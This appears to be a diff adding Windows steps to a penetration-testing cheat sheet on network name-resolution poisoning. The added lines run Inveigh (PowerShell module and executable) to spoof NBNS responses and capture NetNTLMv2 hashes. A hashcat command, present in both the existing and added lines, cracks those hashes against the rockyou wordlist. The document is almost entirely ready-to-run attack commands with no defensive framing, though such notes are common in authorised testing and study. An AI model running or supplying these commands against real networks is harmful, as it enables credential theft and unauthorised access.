@@ -21,3 +21,29 @@ Mode 5600: NetNTLMv2 specific for Responder
 ```
 hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.tx
 ```
+
+# Windows
+## 1
+Configuring the system
+```
+Import-Module .\Inveigh.ps1
+(Get-Command Invoke-Inveigh).Parameters
+```
+
+Explotation
+```
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
+## 2
+```
+.\Inveigh.exe
+```
+Press ESC
+```
+GET NTLMV2UNIQUE
+```
+
+Mode 5600: NetNTLMv2 specific for Responder
+```
+hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.tx
+```
